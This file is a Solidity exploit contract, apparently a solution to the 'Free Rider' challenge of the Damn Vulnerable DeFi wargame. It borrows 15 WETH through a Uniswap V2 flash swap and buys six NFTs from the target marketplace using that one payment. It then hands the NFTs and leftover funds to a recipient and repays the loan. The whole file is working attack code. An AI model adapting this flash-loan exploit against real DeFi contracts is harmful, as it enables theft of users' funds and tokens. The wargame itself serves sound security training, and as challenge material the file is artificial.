pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "solmate/src/tokens/WETH.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


contract AttackerFreeRider is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace private marketplace;
    FreeRiderRecovery private recovery;
    IUniswapV2Pair private pair;
    DamnValuableNFT private nft;
    WETH private weth;
    address private recipient;

    error InsufficientFee(uint sent, uint needed);

    constructor(FreeRiderNFTMarketplace marketplace_, FreeRiderRecovery recovery_, IUniswapV2Pair pair_, WETH weth_, address recipient_) {
        marketplace = marketplace_;
        recovery = recovery_;
        pair = pair_;
        weth = weth_;
        nft = marketplace.token();
        recipient = recipient_;
    }

    modifier onlyPair {
        require(msg.sender == address(pair), "Only pair sender is allowed");
        _;
    }

    function attack() external payable {
        uint amount = 15 ether;
        uint fee = amount * 3 / 997 + 1;
        if (msg.value < fee) {
            revert InsufficientFee(msg.value, fee);
        }
        pair.swap(amount, 0, address(this), abi.encode(fee));
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external onlyPair {
        address weth_ = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        require(weth_ == address(weth), "The token0 received is not weth!");

        weth.withdraw(amount0);

        uint size = 6;
        uint256[] memory tokens = new uint[](size);
        for (uint i; i < size; i++) {
            tokens[i] = i;
        }
        marketplace.buyMany{value: amount0}(tokens);

        nft.setApprovalForAll(recipient, true);
        uint balance = weth.balanceOf(address(this));
        weth.withdraw(balance);
        payable(recipient).transfer(balance);

        uint fee = abi.decode(data, (uint));
        weth.deposit{value: amount0 + fee}();

        weth.transfer(address(msg.sender), amount0 + fee);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4) { 
        nft.approve(address(marketplace), _tokenId);

        return IERC721Receiver.onERC721Received.selector; 
    }
}